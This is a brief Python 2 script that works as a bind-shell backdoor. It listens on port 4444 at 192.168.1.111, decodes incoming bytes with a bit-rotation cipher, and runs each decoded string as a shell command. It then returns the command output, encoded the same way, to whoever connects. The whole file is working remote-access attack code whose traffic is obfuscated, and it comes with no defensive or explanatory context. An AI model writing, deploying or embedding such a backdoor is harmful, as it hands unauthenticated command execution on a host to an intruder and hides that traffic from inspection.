# -*- coding: utf-8 -*-
import socket
import sys
import subprocess

def shiftLeft(val):
	if val > 127:
		val = (val << 1) - 256 + 1
	else:
		val = val << 1
	return val

def shiftRight(val):
	if (val % 2 == 1):
		val = (val >> 1) + 128
	else:
		val = val >> 1
	return val

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_address = ('192.168.1.111', 4444)
print >>sys.stderr,'Starting up on %s port %s' % server_address
sock.bind(server_address)

sock.listen(1)

while True:
	print >>sys.stderr, 'Waiting for connection...'
	connection,client_address = sock.accept()
	
	try:
		print >>sys.stderr, 'Connection from %s', client_address
		
		while True:
			command = ''
			data = connection.recv(1024)
			for i in data:
				tempint = shiftRight(ord(i))
				command += str(unichr(tempint))
			if data:
				print command
				output = subprocess.check_output(command, shell=True)	
				ret_mesg = ''
				for i in output:
					# print i
					tempint = shiftLeft(ord(i))
					ret_mesg += chr(tempint)
				if (ret_mesg == ''):
					ret_mesg = '\n'
				connection.sendall(ret_mesg)
			else:
				print >>sys.stderr, 'No more data from %s', client_address
				break
	finally:
		connection.close()
